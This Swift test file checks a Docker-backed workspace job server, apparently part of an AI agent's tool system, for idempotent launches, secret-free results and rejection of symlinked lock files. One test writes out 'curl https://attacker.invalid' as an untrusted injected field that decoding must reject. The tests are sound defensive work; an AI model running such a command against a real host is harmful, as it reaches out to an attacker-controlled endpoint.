import Foundation
import Testing
import ASTRACore
@testable import WorkspaceToolSupport

private let foundationTaskID = "aaaaaaaa-aaaa-4aaa-8aaa-aaaaaaaaaaaa"
private let foundationRunID = "bbbbbbbb-bbbb-4bbb-8bbb-bbbbbbbbbbbb"

@Suite("Workspace managed-job foundation", .serialized)
struct WorkspaceManagedJobFoundationTests {
    @Test("Provider cleanup preserves executor while trusted work is active")
    func providerCleanupPreservesExecutorForTrustedJob() {
        let executor = FoundationRecordingExecutor()
        let manager = FoundationRecordingJobManager()
        manager.hasOwnedJob = true
        let server = WorkspaceMCPServer(executor: executor, jobManager: manager)

        server.cleanup()
        #expect(!executor.cleanedUp)

        manager.hasOwnedJob = false
        server.cleanup()
        #expect(executor.cleanedUp)
    }

    @Test("Cleanup preserves a same-container receipt owned by a conflicting task")
    func cleanupPreservesConflictingSameContainerReceipt() throws {
        let root = temporaryDirectory("conflict")
        defer { try? FileManager.default.removeItem(at: root) }
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        let store = WorkspaceManagedJobStore(rootPath: jobRoot.path)
        _ = try store.create(
            command: "sleep 60",
            timeoutSeconds: nil,
            label: nil,
            progressProbe: nil,
            runtime: "docker",
            taskID: "cccccccc-cccc-4ccc-8ccc-cccccccccccc",
            runID: "dddddddd-dddd-4ddd-8ddd-dddddddddddd",
            invocationID: "number:77",
            containerName: "astra-shared-container"
        )
        let configuration = WorkspaceToolConfiguration(
            dockerExecutable: "/usr/bin/false",
            image: "astra/workspace:latest",
            containerName: "astra-shared-container",
            workdir: "/workspace",
            network: "none",
            taskID: foundationTaskID,
            runID: foundationRunID,
            mounts: [],
            jobRootHostPath: jobRoot.path,
            jobRootContainerPath: "/workspace/jobs"
        )
        let manager = DockerWorkspaceJobManager(
            configuration: configuration,
            executor: DockerWorkspaceCommandExecutor(configuration: configuration)
        )

        #expect(manager.hasTrustedNonterminalOwnedJob())
    }

    @Test("Managed result is invocation-bound and excludes backend-private fields")
    func managedResultIsStrictAndSecretFree() throws {
        let executor = FoundationRecordingExecutor()
        let manager = FoundationRecordingJobManager()
        let server = WorkspaceMCPServer(executor: executor, jobManager: manager)
        let secret = "secret-token-that-must-not-escape"

        let response = try parseJSON(try #require(server.handleLine(
            #"{"jsonrpc":"2.0","id":"trusted-invocation","method":"tools/call","params":{"name":"workspace_job_start","arguments":{"command":"printf '#(secret)'"}}}"#
        )))
        let text = try resultText(response)
        let result = try #require(response["result"] as? [String: Any])
        let structuredContent = try #require(result["structuredContent"] as? [String: Any])
        let structuredData = try JSONSerialization.data(withJSONObject: structuredContent, options: [.sortedKeys])
        let textObject = try #require(JSONSerialization.jsonObject(with: Data(text.utf8)) as? NSDictionary)
        let structuredObject = try #require(JSONSerialization.jsonObject(with: structuredData) as? NSDictionary)
        let decoded = try structuredJobResult(response)

        #expect(textObject == structuredObject)
        #expect(decoded.startReceipt?.invocationID == "string-base64:dHJ1c3RlZC1pbnZvY2F0aW9u")
        #expect(decoded.startReceipt?.requestFingerprint.hasPrefix("sha256:") == true)
        #expect(!text.contains(secret))
        #expect(!text.contains("printf"))
        #expect(!text.contains("/tmp/job"))
        #expect(!text.contains("message"))

        var untrustedObject = try #require(
            JSONSerialization.jsonObject(with: Data(text.utf8)) as? [String: Any]
        )
        untrustedObject["command"] = "curl https://attacker.invalid"
        let untrustedData = try JSONSerialization.data(withJSONObject: untrustedObject)
        #expect(throws: (any Error).self) {
            _ = try JSONDecoder().decode(WorkspaceManagedJobStructuredResult.self, from: untrustedData)
        }
    }

    @Test("Concurrent identical invocation admits exactly one detached launch")
    func concurrentIdenticalInvocationLaunchesExactlyOnce() throws {
        let fixture = try makeDockerFixture("concurrent")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        let managers = (0..<2).map { _ -> DockerWorkspaceJobManager in
            let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
            return DockerWorkspaceJobManager(configuration: fixture.configuration, executor: executor)
        }
        let resultLock = NSLock()
        var results: [WorkspaceManagedJobRecord] = []
        DispatchQueue.concurrentPerform(iterations: 2) { index in
            let result = managers[index].start(
                command: "printf identical",
                timeoutSeconds: 7200,
                label: "concurrent",
                progressProbe: "log",
                invocationID: "string-base64:c3RhYmxlLWludm9jYXRpb24="
            )
            resultLock.lock()
            results.append(result)
            resultLock.unlock()
        }

        #expect(results.count == 2)
        #expect(Set(results.map(\.jobID)).count == 1)
        #expect(Set(results.compactMap { $0.startReceipt?.externalIdentity }).count == 1)
        #expect(results.contains { $0.status == .running })
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
        #expect(logLines.filter { $0.contains("run --rm -d") }.count == 1)
    }

    @Test("Invocation id reuse with a different payload fails before relaunch")
    func invocationIDPayloadMismatchFailsClosed() throws {
        let fixture = try makeDockerFixture("mismatch")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        let manager = DockerWorkspaceJobManager(configuration: fixture.configuration, executor: executor)
        let invocationID = "number:42"

        let first = manager.start(
            command: "printf first",
            timeoutSeconds: 7200,
            label: "original",
            progressProbe: nil,
            invocationID: invocationID
        )
        let mismatch = manager.start(
            command: "printf different",
            timeoutSeconds: 7200,
            label: "original",
            progressProbe: nil,
            invocationID: invocationID
        )

        #expect(first.status == .running)
        #expect(mismatch.status == .failed)
        #expect(mismatch.message?.contains("reused with a different request") == true)
        let records = try WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath
        ).listTrustedRecords()
        #expect(records.count == 1)
        #expect(records.first?.jobID == first.jobID)
        let logLines = try String(contentsOf: fixture.log, encoding: .utf8).split(separator: "\n")
        #expect(logLines.filter { $0.contains("exec -d") }.count == 1)
    }

    @Test("Non-finite timeout is rejected before durable admission or Docker")
    func nonFiniteTimeoutFailsBeforeAdmission() throws {
        let fixture = try makeDockerFixture("nonfinite")
        defer { try? FileManager.default.removeItem(at: fixture.root) }
        let executor = DockerWorkspaceCommandExecutor(configuration: fixture.configuration)
        let manager = DockerWorkspaceJobManager(configuration: fixture.configuration, executor: executor)

        let result = manager.start(
            command: "printf never",
            timeoutSeconds: .infinity,
            label: nil,
            progressProbe: nil,
            invocationID: "number:99"
        )

        #expect(result.status == .failed)
        #expect(result.message?.contains("Invalid workspace managed-job request payload") == true)
        #expect(!FileManager.default.fileExists(atPath: fixture.log.path))
        let records = try WorkspaceManagedJobStore(
            rootPath: fixture.configuration.jobRootHostPath
        ).listTrustedRecords()
        #expect(records.isEmpty)
    }

    @Test("Admission rejects a symlink-substituted kernel lock")
    func admissionRejectsSymlinkedLock() throws {
        let root = temporaryDirectory("lock-symlink")
        defer { try? FileManager.default.removeItem(at: root) }
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let outside = root.appendingPathComponent("outside")
        try "do-not-touch".write(to: outside, atomically: true, encoding: .utf8)
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        try FileManager.default.createDirectory(at: jobRoot, withIntermediateDirectories: true)
        try FileManager.default.createSymbolicLink(
            at: jobRoot.appendingPathComponent(".invocation-admission.lock"),
            withDestinationURL: outside
        )
        let store = WorkspaceManagedJobStore(rootPath: jobRoot.path)

        #expect(throws: (any Error).self) {
            _ = try store.admitInvocation(
                command: "true",
                timeoutSeconds: nil,
                label: nil,
                progressProbe: nil,
                runtime: "docker",
                taskID: foundationTaskID,
                runID: foundationRunID,
                invocationID: "number:9",
                containerName: "astra-lock-test"
            )
        }
        #expect(try String(contentsOf: outside, encoding: .utf8) == "do-not-touch")
        #expect(try store.listTrustedRecords().isEmpty)
    }

    private func temporaryDirectory(_ suffix: String) -> URL {
        FileManager.default.temporaryDirectory
            .appendingPathComponent("astra-managed-foundation-\(suffix)-\(UUID().uuidString)", isDirectory: true)
    }

    private func makeDockerFixture(_ suffix: String) throws -> DockerFixture {
        let root = temporaryDirectory(suffix)
        try FileManager.default.createDirectory(at: root, withIntermediateDirectories: true)
        let jobRoot = root.appendingPathComponent("jobs", isDirectory: true)
        let docker = root.appendingPathComponent("docker")
        let log = root.appendingPathComponent("docker.log")
        let quotedLogPath = log.path.replacingOccurrences(of: "'", with: "'\\''")
        let quotedJobRoot = jobRoot.path.replacingOccurrences(of: "'", with: "'\\''")
        try """
        #!/bin/sh
        printf '%s\\n' "$*" >> '\(quotedLogPath)'
        case "$1" in
          inspect) exit 1 ;;
          rm) exit 0 ;;
          run) echo container-id; exit 0 ;;
          exec)
            record="$(find '\(quotedJobRoot)' -name job.json -type f | head -1)"
            grep -q '"status" : "queued"' "$record" || exit 41
            grep -q '"startReceipt"' "$record" || exit 42
            exit 0
            ;;
          stop) exit 0 ;;
          *) exit 99 ;;
        esac
        """.write(to: docker, atomically: true, encoding: .utf8)
        try FileManager.default.setAttributes([.posixPermissions: 0o755], ofItemAtPath: docker.path)
        return DockerFixture(
            root: root,
            log: log,
            configuration: WorkspaceToolConfiguration(
                dockerExecutable: docker.path,
                image: "astra/workspace:latest",
                containerName: "astra-test-\(suffix)",
                workdir: "/workspace",
                network: "bridge",
                taskID: foundationTaskID,
                runID: foundationRunID,
                mounts: [
                    WorkspaceDockerMount(hostPath: root.path, containerPath: "/workspace", access: "rw", role: "workspace")
                ],
                jobRootHostPath: jobRoot.path,
                jobRootContainerPath: "/workspace/jobs"
            )
        )
    }

    private func parseJSON(_ line: String) throws -> [String: Any] {
        try #require(JSONSerialization.jsonObject(with: Data(line.utf8)) as? [String: Any])
    }

    private func resultText(_ object: [String: Any]) throws -> String {
        let result = try #require(object["result"] as? [String: Any])
        let content = try #require(result["content"] as? [[String: Any]])
        return try #require(content.first?["text"] as? String)
    }

    private func structuredJobResult(_ object: [String: Any]) throws -> WorkspaceManagedJobStructuredResult {
        try JSONDecoder().decode(
            WorkspaceManagedJobStructuredResult.self,
            from: Data(try resultText(object).utf8)
        )
    }
}

private struct DockerFixture {
    var root: URL
    var log: URL
    var configuration: WorkspaceToolConfiguration
}

private final class FoundationRecordingExecutor: WorkspaceCommandExecutor {
    private(set) var cleanedUp = false

    func run(command: String, timeoutSeconds _: TimeInterval) -> WorkspaceCommandResult {
        WorkspaceCommandResult(command: command, exitCode: 0, stdout: "", stderr: "")
    }

    func cleanup() { cleanedUp = true }
}

private final class FoundationRecordingJobManager: WorkspaceJobManaging {
    var hasOwnedJob = false

    func start(
        command: String,
        timeoutSeconds: TimeInterval?,
        label: String?,
        progressProbe: String?,
        invocationID: String
    ) -> WorkspaceManagedJobRecord {
        let now = Date(timeIntervalSince1970: 1_782_300_000)
        let receipt = try! WorkspaceManagedJobStartReceipt.make(
            taskID: foundationTaskID,
            runID: foundationRunID,
            invocationID: invocationID,
            requestFingerprint: try! WorkspaceManagedJobRequestFingerprint.make(
                command: command,
                timeoutSeconds: timeoutSeconds,
                label: label,
                progressProbe: progressProbe
            ),
            containerName: "astra-test-job",
            jobID: "job-1"
        )
        return WorkspaceManagedJobRecord(
            jobID: "job-1",
            command: command,
            label: label,
            progressProbe: progressProbe,
            runtime: "docker",
            status: .running,
            createdAt: now,
            startedAt: now,
            updatedAt: now,
            stdoutLogPath: "/tmp/job/stdout.log",
            stderrLogPath: "/tmp/job/stderr.log",
            heartbeatPath: "/tmp/job/heartbeat.json",
            resultPath: "/tmp/job/result.json",
            startReceipt: receipt
        )
    }

    func status(jobID: String) -> WorkspaceManagedJobRecord {
        start(command: "status", timeoutSeconds: nil, label: nil, progressProbe: nil, invocationID: "number:2")
    }

    func tail(jobID: String, stream: String, lines _: Int) -> WorkspaceManagedJobTail {
        WorkspaceManagedJobTail(jobID: jobID, stream: stream, text: "")
    }

    func cancel(jobID: String) -> WorkspaceManagedJobRecord {
        start(command: "cancel", timeoutSeconds: nil, label: nil, progressProbe: nil, invocationID: "number:3")
    }

    func wait(jobID: String, timeoutSeconds: TimeInterval) -> WorkspaceManagedJobRecord {
        start(command: "wait", timeoutSeconds: timeoutSeconds, label: nil, progressProbe: nil, invocationID: "number:4")
    }

    func hasTrustedNonterminalOwnedJob() -> Bool { hasOwnedJob }
}
